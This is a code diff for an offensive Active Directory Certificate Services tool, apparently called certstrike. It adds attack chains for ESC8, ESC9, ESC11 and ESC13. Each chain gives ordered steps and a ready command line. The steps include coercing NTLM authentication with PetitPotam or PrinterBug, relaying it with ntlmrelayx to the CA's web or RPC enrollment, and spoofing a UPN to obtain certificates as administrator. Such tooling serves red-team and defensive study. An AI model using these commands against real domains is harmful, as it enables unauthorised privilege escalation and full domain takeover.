@@ -30,7 +30,10 @@ var ESCDescription = map[string]struct {
 	"ESC5":      {"Vulnerable PKI Object ACLs", "Modify CA or enrollment service configuration", "High"},
 	"ESC6":      {"EDITF_ATTRIBUTESUBJECTALTNAME2", "CA allows arbitrary SAN in requests", "Low"},
 	"ESC7":      {"Vulnerable CA ACLs", "ManageCA/ManageCertificates on CA server", "Medium"},
-	"ESC8":      {"NTLM Relay to AD CS HTTP Endpoints", "Relay NTLM auth to web enrollment", "Medium"},
+	"ESC8":      {"NTLM Relay to AD CS HTTP Endpoints", "Relay NTLM auth to web enrollment for certificate issuance", "Medium"},
+	"ESC9":      {"CT_FLAG_NO_SECURITY_EXTENSION (No Security Extension)", "UPN spoofing via certificate without requester SID", "Medium"},
+	"ESC11":     {"NTLM Relay to AD CS RPC Interface", "Relay NTLM auth to ICertPassage RPC for certificate issuance", "Medium"},
+	"ESC13":     {"OID group link — issuance policy linked to security group via msDS-OIDToGroupLink", "Privilege escalation via OID-to-group membership mapping", "Low"},
 }
 
 // BuildAttackChain analyzes enumerated templates and generates prioritized attack paths.
@@ -106,6 +109,24 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Enroll for enrollment agent certificate",
 			"Use agent certificate to enroll on behalf of other users in restricted templates",
 		}
+	case "ESC13":
+		return []string{
+			fmt.Sprintf("Identify template: %s (issuance policy OID linked to security group)", tmpl.Name),
+			"Enroll in the template — the issued certificate contains the linked issuance policy OID",
+			"Authenticate via Kerberos PKINIT — the OID maps to group membership in the TGT",
+			fmt.Sprintf("Command: certstrike pki --exploit esc13 --template %s --upn %s@%s --target-dc %s --domain %s",
+				tmpl.Name, cfg.Username, cfg.Domain, cfg.TargetDC, cfg.Domain),
+		}
+	case "ESC9":
+		return []string{
+			fmt.Sprintf("Identify template: %s (CT_FLAG_NO_SECURITY_EXTENSION + auth EKU)", tmpl.Name),
+			"Modify attacker's userPrincipalName to target UPN",
+			"Request certificate from vulnerable template — cert lacks requester SID extension",
+			"Restore attacker's original UPN",
+			"Authenticate with issued certificate — DC maps cert to target UPN (no SID check)",
+			fmt.Sprintf("Command: certstrike pki --exploit esc9 --template %s --upn administrator@%s --attacker-dn CN=%s,... --target-dc %s --domain %s",
+				tmpl.Name, cfg.Domain, cfg.Username, cfg.TargetDC, cfg.Domain),
+		}
 	case "ESC4", "ESC4-CHECK":
 		return []string{
 			fmt.Sprintf("Identify template: %s (WriteDacl/WriteOwner ACL)", tmpl.Name),
@@ -114,6 +135,22 @@ func buildSteps(escType string, tmpl CertTemplate, cfg *ADCSConfig) []string {
 			"Restore original template configuration",
 			fmt.Sprintf("Command: certstrike pki --exploit esc4 --template %s --upn administrator@%s --target-dc %s --domain %s",
 				tmpl.Name, cfg.Domain, cfg.TargetDC, cfg.Domain),
+		}
+	case "ESC8":
+		return []string{
+			"Identify CA with HTTP web enrollment endpoint (/certsrv/) accepting NTLM",
+			"Coerce NTLM authentication from a privileged account (e.g., PetitPotam, PrinterBug)",
+			"Relay coerced NTLM auth to the CA's /certsrv/ endpoint via ntlmrelayx",
+			"Obtain certificate as the relayed principal",
+			fmt.Sprintf("Command: ntlmrelayx.py -t http://<CA_HOSTNAME>/certsrv/certfnsh.asp -smb2support --adcs --template %s", tmpl.Name),
+		}
+	case "ESC11":
+		return []string{
+			"Identify CA with IF_ENFORCEENCRYPTICERTREQUEST flag NOT set",
+			"Coerce NTLM authentication from a privileged account (e.g., PetitPotam, PrinterBug)",
+			"Relay coerced NTLM auth to the CA's RPC interface (ICertPassage/MS-ICPR)",
+			"Obtain certificate as the relayed principal",
+			fmt.Sprintf("Command: ntlmrelayx.py -t rpc://<CA_HOSTNAME> -rpc-mode ICPR -icpr-ca-name %q -smb2support", tmpl.Name),
 		}
 	default:
 		return []string{
